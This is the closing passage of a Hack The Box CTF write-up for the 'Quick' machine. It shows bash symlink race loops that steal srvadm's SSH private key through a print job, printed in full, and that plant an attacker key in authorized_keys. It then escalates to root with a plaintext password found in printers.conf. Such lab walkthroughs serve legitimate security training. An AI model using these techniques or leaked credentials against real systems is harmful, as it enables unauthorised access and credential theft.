<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">true</span> <span class="p">;</span> <span class="k">do </span><span class="nv">N</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%Y-%m-%d_%H:%M:%S<span class="sb">`</span> <span class="p">;</span> <span class="k">if</span> <span class="o">[[</span> <span class="nt">-r</span> <span class="nv">$N</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then </span><span class="nb">rm</span> <span class="nt">-f</span> <span class="nv">$N</span> <span class="p">;</span> <span class="nb">ln</span> <span class="nt">-s</span> /home/srvadm/.ssh/id_rsa <span class="nv">$N</span> <span class="p">;</span> <span class="k">fi</span> <span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p>The printer job will the send the private key to us instead of print job we submitted.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 9100 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.186] 58348
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----
</code></pre></div></div>

<p>To abuse the file write and put my public SSH in the <code class="language-plaintext highlighter-rouge">srvadm</code> user directory instead, we can do this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while true ; do N=`date +%Y-%m-%d_%H:%M:%S` ; if [[ ! -r $N ]] ; then rm -f $N ; ln -s /home/srvadm/.ssh/authorized_keys $N ; fi ; done
</code></pre></div></div>

<p>In the print job form, Iâ€™ll send my SSH key:</p>

<p><img src="/assets/images/htb-writeup-quick/image-20200425212900578.png" alt=""></p>

<p>Now that my key has been uploaded, I can SSH to the server as user <code class="language-plaintext highlighter-rouge">srvadm</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# ssh srvadm@10.10.10.186
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

[...]

Last login: Sat Apr 25 21:57:39 2020 from 10.10.14.10
srvadm@quick:~$ id
uid=1001(srvadm) gid=1001(srvadm) groups=1001(srvadm),999(printers)
</code></pre></div></div>

<h2 id="privesc">Privesc</h2>

<p>I looked at the files in srvadmâ€™s home directories and found a few things that stood out:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./.cache/conf.d:
total 20
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 .
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 ..
-rw-r--r-- 1 srvadm srvadm 4569 Mar 20 06:20 cupsd.conf
-rw-r--r-- 1 srvadm srvadm 4038 Mar 20 06:23 printers.conf

./.cache/logs:
total 96
drwxr-xr-x 2 srvadm srvadm  4096 Mar 20 06:46 .
drwx------ 5 srvadm srvadm  4096 Mar 20 06:20 ..
-rw-r--r-- 1 srvadm srvadm  9064 Mar 20 06:19 cups.log
-rw-rw-r-- 1 srvadm srvadm 71479 Mar 20 06:46 debug.log
-rw-rw-r-- 1 srvadm srvadm  1136 Mar 20 06:39 error.log
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">.cache/conf.d/printers.conf</code> file contains credentials:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
State Idle
[...]
</code></pre></div></div>

<p>We can URL decode many ways, such as using PHP:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>srvadm@quick:~$ php -r 'echo urldecode("srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb\n");'
srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb
</code></pre></div></div>

<p>The password <code class="language-plaintext highlighter-rouge">&amp;ftQ4K3SGde8?</code> is the root password. We can use su and get root access.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>srvadm@quick:~$ su
Password: 
root@quick:/home/srvadm# id
uid=0(root) gid=0(root) groups=0(root)
root@quick:/home/srvadm# cat /root/root.txt
ca70f7b71[...]
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#esi" class="page__taxonomy-item" rel="tag">esi</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#mysql" class="page__taxonomy-item" rel="tag">mysql</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#port-forward" class="page__taxonomy-item" rel="tag">port forward</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#quic" class="page__taxonomy-item" rel="tag">quic</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#race-condition" class="page__taxonomy-item" rel="tag">race condition</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#xslt" class="page__taxonomy-item" rel="tag">xslt</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-08-29T00:00:00+02:00">August 29, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-magic/" class="pagination--pager" title="Magic - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-remote/" class="pagination--pager" title="Remote - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">Â© 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
